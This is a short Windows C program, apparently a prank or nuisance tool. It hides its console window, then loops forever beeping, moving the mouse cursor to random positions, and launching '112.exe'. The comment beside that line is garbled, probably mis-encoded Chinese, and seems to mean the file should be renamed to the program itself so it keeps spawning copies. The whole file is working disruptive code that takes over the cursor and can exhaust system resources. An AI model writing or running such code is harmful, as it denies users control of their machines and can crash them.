#include<windows.h>
#include<stdio.h>
#include <stdlib.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")


int main()
{
	
	ShowWindow(FindWindow("ConsoleWindowClass", 0), 0); 
	int x,y; 
	while(1)
    {
    	printf("\a");
    	
		x=rand()%801;
       	y=rand()%601;
       	SetCursorPos(x,y);
       	
       	char * cmd = "112.exe";//������������ָĵ��������������ļ� 
   		system(cmd);
	}
	return 0;
}

